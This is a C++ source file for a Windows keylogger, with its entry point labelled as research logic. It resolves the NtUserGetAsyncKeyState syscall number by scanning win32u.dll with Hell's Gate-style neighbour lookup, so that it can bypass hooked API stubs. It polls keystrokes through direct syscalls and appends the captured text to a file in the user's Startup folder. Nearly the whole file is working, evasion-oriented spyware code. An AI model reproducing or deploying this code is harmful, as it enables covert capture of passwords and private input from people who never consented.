#include <windows.h>
#include <psapi.h>
#include <fstream>
#include <string>
#include <shlobj.h>
#include <objbase.h>
#include <cctype>
#include <thread>

#include "secbuff.hpp"

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "uuid.lib")
#pragma comment(lib, "Psapi.lib")

// Links to your assembly bridge
extern "C" short DirectSyscallBridge(int keyCode, DWORD ssn, uintptr_t syscallAddr);

uintptr_t FindSyscallGadget() {
    HMODULE hMod = GetModuleHandleA("win32u.dll");
    if (!hMod) hMod = LoadLibraryA("win32u.dll");
    if (!hMod) return 0;

    MODULEINFO modInfo;
    GetModuleInformation(GetCurrentProcess(), hMod, &modInfo, sizeof(modInfo));

    unsigned char* base = (unsigned char*)modInfo.lpBaseOfDll;
    for (DWORD i = 0; i < modInfo.SizeOfImage - 1; i++) {
        if (base[i] == 0x0F && base[i + 1] == 0x05) return (uintptr_t)(base + i);
    }
    return 0;
}

DWORD ScanForSyscallID(const char* functionName) {
    HMODULE hMod = GetModuleHandleA("win32u.dll");
    uintptr_t funcAddr = (uintptr_t)GetProcAddress(hMod, functionName);
    if (!funcAddr) return 0;

    unsigned char* ptr = (unsigned char*)funcAddr;
    if (ptr[0] == 0xE9) { // Hell's Gate neighbor scanning
        for (int i = 1; i < 500; i++) {
            if (ptr[i] == 0x4C && ptr[i + 3] == 0xB8) return *(DWORD*)(ptr + i + 4);
            if (ptr[-i] == 0x4C && ptr[-i + 3] == 0xB8) return *(DWORD*)(ptr - i + 4);
        }
    }
    if (ptr[3] == 0xB8) return *(DWORD*)(ptr + 4);
    return 0;
}

std::string GetKeyString(int vk, bool shift) {
    int key = static_cast<int>(vk);
    if (key >= 0x30 && key <= 0x39) {
        if (shift) return std::string(1, ")!@#$%^&*("[key - 0x30]);
        return std::to_string(key - 0x30);
    }
    if (key >= 0x41 && key <= 0x5A) return std::string(1, (char)(shift ? key : key + 32));
    switch (key) {
    case VK_SPACE:  return " ";
    case VK_RETURN: return "\n[ENTER]\n";
    case VK_BACK:   return "[BACK]";
    case VK_TAB:    return "\t";
    default:        return "";
    }
}

void writeToFile(std::string textData) {
    char path[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        std::string textFilePath = std::string(path) + "\\MyStartupNote.txt";
        std::ofstream outFile(textFilePath, std::ios::app);
        if (outFile.is_open()) {
            outFile << textData << "\n";
            outFile.close();
        }
    }
}

extern "C" void RunResearchLogic() {
    GetDesktopWindow();
    DWORD keySSN = ScanForSyscallID("NtUserGetAsyncKeyState");
    uintptr_t gadget = FindSyscallGadget();
    RollingSecureBuffer buffer;

    if (keySSN != 0 && gadget != 0) {
        bool keyWasDown[256] = { false };
        while (true) {
            bool shift = (DirectSyscallBridge(VK_SHIFT, keySSN, gadget) & 0x8000);
            for (int vk = 0x08; vk <= 0x5A; vk++) {
                short state = DirectSyscallBridge(vk, keySSN, gadget);
                bool isDown = (state & 0x8000);
                if (isDown && !keyWasDown[vk]) {
                    std::string keyStroke = GetKeyString(vk, shift);
                    if (!keyStroke.empty()) {
                        for (char c : keyStroke) buffer.addChar(c);
                    }
                    keyWasDown[vk] = true;
                }
                else if (!isDown && keyWasDown[vk]) keyWasDown[vk] = false;
            }
            if (buffer.size() >= 20) {
                writeToFile(buffer.getDecryptedData());
                buffer.clear();
            }
            Sleep(10);
        }
    }
}
